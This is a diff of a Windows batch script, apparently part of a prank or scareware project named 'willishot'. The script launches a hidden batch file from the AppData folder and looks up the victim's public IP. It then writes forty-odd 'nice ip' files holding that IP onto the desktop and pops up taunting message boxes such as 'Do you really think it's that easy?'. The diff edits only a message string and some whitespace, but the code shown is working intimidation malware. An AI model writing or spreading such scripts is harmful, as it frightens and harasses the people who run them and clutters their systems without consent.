@@ -3,7 +3,7 @@ start /min %appdata%\willishot\notif.bat
 cd C:\Users\%USERNAME%\Desktop\
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 echo nice ip %PublicIP% > "nice ip0.txt"
-echo nice ip %PublicIP% > "nice ip1.txt"
+echo nice ip %PublicIP% > "nice ip1.txt" 
 echo nice ip %PublicIP% > "nice ip2.txt"
 echo nice ip %PublicIP% > "nice ip3.txt"
 echo nice ip %PublicIP% > "nice ip4.txt"
@@ -43,7 +43,7 @@ echo nice ip %PublicIP% > "nice ip37.txt"
 echo nice ip %PublicIP% > "nice ip38.txt"
 echo nice ip %PublicIP% > "nice ip39.txt"
 echo nice ip %PublicIP% > "nice ip40.txt"
-cscript %appdata%\willishot\MessageBox.vbs "Nice IP" >nul
+cscript %appdata%\willishot\MessageBox.vbs "Nice computer" >nul
 ping localhost -n 2 >nul
 cscript %appdata%\willishot\MessageBox.vbs "Do you really think it's that easy?" >nul
 ping localhost -n 2 >nul
